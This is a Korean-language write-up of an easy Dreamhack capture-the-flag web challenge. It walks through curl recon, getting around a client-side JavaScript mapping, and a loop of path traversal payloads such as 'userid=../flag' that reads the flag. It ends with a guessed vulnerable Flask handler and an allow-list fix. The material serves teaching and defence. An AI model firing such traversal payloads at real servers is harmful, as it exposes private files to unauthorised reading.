# DREAMHACK CTF - Path Traversal

## Challenge Info

- Target: `http://host3.dreamhack.games:10376/get_info`
- Category: Web
- Vulnerability: Path Traversal
- Difficulty: Easy

---

## Goal

`userid` 를 입력하면 해당 사용자의 정보를 JSON으로 보여주는 페이지다.

핵심은 서버가 `userid` 를 어떻게 파일 경로에 반영하는지 확인하고, 경로 검증이 없는지 보는 것이다.

---

## 사고 흐름

1. 루트 페이지를 확인해서 메인 엔드포인트가 `/get_info` 인지 확인했다.
2. `/get_info` 에서 `userid` 입력 폼과 JavaScript 매핑을 확인했다.
3. 브라우저가 하는 값 변환은 클라이언트 측 로직이므로, `curl` 로 직접 POST 를 보내 우회했다.
4. `userid=0` 과 `userid=1` 에서 각각 다른 JSON 응답이 나오는 것을 보고, 서버가 내부 파일을 읽어 응답하는 구조라고 추정했다.
5. `userid=../flag` 같은 디렉터리 순회 페이로드를 넣어 경로 탈출을 시도했다.
6. 응답에서 플래그를 확인했다.

---

## 1. Surface Recon

### 루트 페이지 확인

```bash
curl -s -i "http://host3.dreamhack.games:10376/"
```

응답에는 `Get User Info` 링크 하나만 있었고, 다른 기능은 보이지 않았다.

여기서 `/get_info` 가 메인 엔드포인트라고 판단했다.

### `/get_info` 페이지 확인

```bash
curl -s -i "http://host3.dreamhack.games:10376/get_info"
```

페이지에는 다음과 같은 폼과 스크립트가 있었다.

```html
<title>Get User Info Path Traversal</title>

<form method="POST" id="form">
  <input type="text" name="userid" value="guest" required>
</form>

<script>
  const users = { 'guest': 0, 'admin': 1 }
  function user(evt){
    document.getElementById('userid').value = users[document.getElementById('userid').value];
    return true;
  }
  window.onload = function() {
    document.getElementById('form').addEventListener('submit', user);
  }
</script>
```

여기서 본 핵심은 두 가지다.

- 제목에 `Path Traversal` 이 직접 적혀 있다.
- `guest -> 0`, `admin -> 1` 변환은 JavaScript 에만 있다.

즉, 이 JS 는 편의용 UI 로직일 뿐이고 보안 장치가 아니다.

---

## 2. Baseline Behavior

브라우저의 JS 변환을 우회하려고 직접 POST 요청을 보냈다.

```bash
curl -s -X POST "http://host3.dreamhack.games:10376/get_info" --data-urlencode "userid=0"
curl -s -X POST "http://host3.dreamhack.games:10376/get_info" --data-urlencode "userid=1"
```

응답은 각각 아래처럼 JSON 이었다.

```html
<pre>{"userid": "guest", "level": 1, "password": "guest"}</pre>
<pre>{"userid": "admin", "level": 9999, "password": "admin"}</pre>
```

이 결과로부터 다음을 추정할 수 있다.

- 서버가 사용자별 데이터 파일을 읽고 있다.
- 파일 이름은 `userid` 값과 연결되어 있을 가능성이 높다.
- 입력값이 곧 파일 경로가 되는 구조라면 디렉터리 순회가 가능할 수 있다.

여기서 중요한 점은, JSON 응답 자체만으로 파일 경로를 단정할 수는 없다는 것이다.

다만 CTF 힌트와 응답 구조를 함께 보면, 파일 기반 조회일 가능성이 충분히 높다.

---

## 3. 옵션 설명

이 문제에서 사용한 `curl` 옵션은 단순한 관습이 아니라, 각각 목적이 있다.

### `-s` / `--silent`

```bash
curl -s ...
```

- 진행률 표시를 끈다.
- 출력이 깔끔해져서 응답 본문만 보기 쉽다.
- 단, 에러 메시지도 숨기므로 디버깅할 때는 `-sS` 가 더 낫다.

### `-i` / `--include`

```bash
curl -s -i "http://host3.dreamhack.games:10376/get_info"
```

- HTTP 헤더까지 같이 출력한다.
- 상태 코드, `Content-Type`, 서버 정보 같은 메타데이터를 같이 볼 수 있다.
- 정찰 단계에서 유용하다.

### `-X POST`

```bash
curl -s -X POST ...
```

- 요청 메서드를 명시적으로 POST 로 고정한다.
- `--data-urlencode` 를 쓰면 curl 이 자동으로 POST 를 선택하기도 하지만, 여기서는 의도를 분명히 보여주기 위해 함께 썼다.
- 즉, 필수라기보다 명시성 확보용이다.

### `--data-urlencode`

```bash
curl -s -X POST ... --data-urlencode "userid=../flag"
```

- 폼 전송 형식으로 데이터를 보낸다.
- 값 안의 특수문자, 예를 들면 `/`, `&`, `=` 를 URL 인코딩해준다.
- `userid` 값에 `../` 같은 문자열을 넣을 때도 전송 형식이 깨지지 않는다.

### `--max-time`

```bash
curl -s --max-time 10 ...
```

- 요청 전체에 대한 최대 대기 시간을 제한한다.
- 서버가 멈추거나 네트워크가 꼬였을 때 무한 대기를 막는다.
- CTF 에서는 반복 실험이 많아서 타임아웃이 있으면 편하다.

### `grep -A1` 와 `head -n 2`

```bash
curl ... | grep -A1 '<pre>' | head -n 2
```

- `grep -A1` 는 매치된 줄과 그 다음 줄까지 함께 보여준다.
- 서버가 `<pre>` 안에 결과를 넣는 형태라면, 한 줄만 잡는 것보다 출력 구조를 더 잘 확인할 수 있다.
- `head -n 2` 는 결과를 짧게 잘라서 한눈에 보기 좋게 만든다.

---

## 4. 가설 수립

정상 응답이 `userid` 별로 달라지는 것을 보고 다음과 같이 가설을 세웠다.

- 서버는 `users/{userid}.json` 같은 경로를 열고 있을 수 있다.
- `userid` 에 대한 검증이 없다면 `../` 로 상위 디렉터리를 탈출할 수 있다.
- 그러면 `users/../flag` 는 실제로 `flag` 쪽 파일을 가리킬 수 있다.

이 단계의 가설은 코드가 아니라 동작을 보고 세운 추정이다.

---

## 5. Exploitation

### 후보 경로 일괄 시험

정확한 파일 위치를 모르므로 여러 후보를 한 번에 시험했다.

```bash
for p in "../flag" "../../flag" "../flag.txt" "../../flag.txt" \
         "../flag/flag.txt" "../app/flag.txt" "../app/flag" \
         "flag" "flag.txt"; do
  echo "=== userid=$p ==="
  curl -s -X POST "http://host3.dreamhack.games:10376/get_info" \
    --data-urlencode "userid=$p" --max-time 10 \
    | grep -A1 '<pre>' | head -n 2
done
```

이렇게 한 이유는 간단하다.

- 파일 확장자가 `.json` 일 수도 있고 아닐 수도 있다.
- 작업 디렉터리 기준으로 한 단계 위일 수도 있고, 두 단계 위일 수도 있다.
- CTF 에서는 정확한 저장 위치가 공개되지 않는 경우가 많아서, 후보를 넓게 잡는 편이 빠르다.

### 성공 페이로드

```bash
curl -s -X POST "http://host3.dreamhack.games:10376/get_info" \
  --data-urlencode "userid=../flag"
```

### 응답

```html
<pre>DH{REDACTED}</pre>
```

실제 플래그 원문은 공개하지 않았다.

---

## 6. Root Cause

취약점의 본질은 두 가지다.

### 1) 경로 검증 부재

- `userid` 값이 그대로 파일 경로에 들어간다.
- `../` 같은 디렉터리 순회 시퀀스를 막지 않았다.
- 사용자 입력을 파일 시스템 경로에 직접 연결하는 패턴 자체가 위험하다.

### 2) 클라이언트 사이드 검증 의존

- JavaScript 의 `users` 매핑은 서버 보안이 아니다.
- 브라우저에서만 실행되므로 `curl` 이나 다른 도구로 쉽게 우회된다.
- 보안 검증은 반드시 서버에서 다시 해야 한다.

### 취약 코드의 추정 형태

```python
@app.route('/get_info', methods=['GET', 'POST'])
def get_info():
    userid = request.form.get('userid', '')
    with open(f'users/{userid}.json') as f:
        data = json.load(f)
    return render_template('get_info.html', data=data)
```

이 코드는 설명을 위한 추정 예시다. 실제 서버 코드가 정확히 같다는 뜻은 아니다.

### 더 안전한 방향

가장 좋은 방식은 경로 문자열을 조합하는 대신 허용된 사용자만 매핑하는 것이다.

```python
from flask import abort

ALLOWED_USERS = {'0', '1'}

@app.route('/get_info', methods=['GET', 'POST'])
def get_info():
    userid = request.form.get('userid', '')
    if userid not in ALLOWED_USERS:
        abort(400)

    # 사용자 입력을 경로에 직접 넣지 않는 것이 가장 안전하다.
    # 필요하다면 별도 매핑 테이블로 파일명을 선택한다.
```

---

## 7. Key Takeaways

- 클라이언트 측 입력 검증은 보안이 아니다. 서버에서 다시 검증해야 한다.
- 파일 경로 입력은 위험하다. `open()`, `send_file()`, `include` 류에서는 특히 조심해야 한다.
- 화이트리스트가 블랙리스트보다 낫다.
- CTF 에서는 페이지 제목, HTML 주석, 응답 패턴이 힌트인 경우가 많다.
- `curl --data-urlencode` 는 특수문자가 섞인 페이로드를 보낼 때 유용하다.

---

## 8. Reproducible Final Command

```bash
curl -s -X POST "http://host3.dreamhack.games:10376/get_info" \
  --data-urlencode "userid=../flag" \
  | grep -A1 '<pre>' \
  | head -n 1
```

출력은 플래그가 들어간 `<pre>` 블록이지만, 공개본에서는 마스킹했다.

---

## Final Flag

`DH{REDACTED}`
